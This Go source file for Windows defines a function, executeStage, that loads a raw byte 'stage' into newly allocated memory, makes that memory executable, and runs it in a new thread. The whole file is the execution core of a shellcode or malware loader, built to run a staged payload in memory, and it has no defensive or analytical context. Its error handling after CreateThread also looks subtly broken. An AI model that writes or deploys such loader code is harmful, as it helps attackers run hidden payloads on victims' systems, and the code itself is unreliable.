//go:build windows

package main

import (
	"errors"
	"fmt"

	"golang.org/x/sys/windows"
)

var kernel32 = windows.NewLazySystemDLL("kernel32.dll")

func executeStage(stage []byte) error {
	if len(stage) == 0 {
		return errors.New("empty stage")
	}

	base, err := windows.VirtualAlloc(0, uintptr(len(stage)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("allocate RW memory: %w", err)
	}

	var written uintptr
	if err := windows.WriteProcessMemory(windows.CurrentProcess(), base,
		&stage[0], uintptr(len(stage)), &written); err != nil {
		return fmt.Errorf("write stage memory: %w", err)
	}

	var oldProtect uint32
	if err := windows.VirtualProtect(base, uintptr(len(stage)),
		windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
		return fmt.Errorf("change memory protection to RX: %w", err)
	}

	threadValue, _, callErr := kernel32.NewProc("CreateThread").Call(
		0, 0, base, 0, uintptr(windows.CREATE_SUSPENDED), 0)
	if callErr != nil || threadValue == 0 {
		return fmt.Errorf("create suspended thread: %w", callErr)
	}
	thread := windows.Handle(threadValue)
	if _, err := windows.ResumeThread(thread); err != nil {
		_, _, _ = kernel32.NewProc("TerminateThread").Call(threadValue, 1)
		_ = windows.CloseHandle(thread)
		return fmt.Errorf("resume thread: %w", err)
	}
	_ = windows.CloseHandle(thread)
	return nil
}
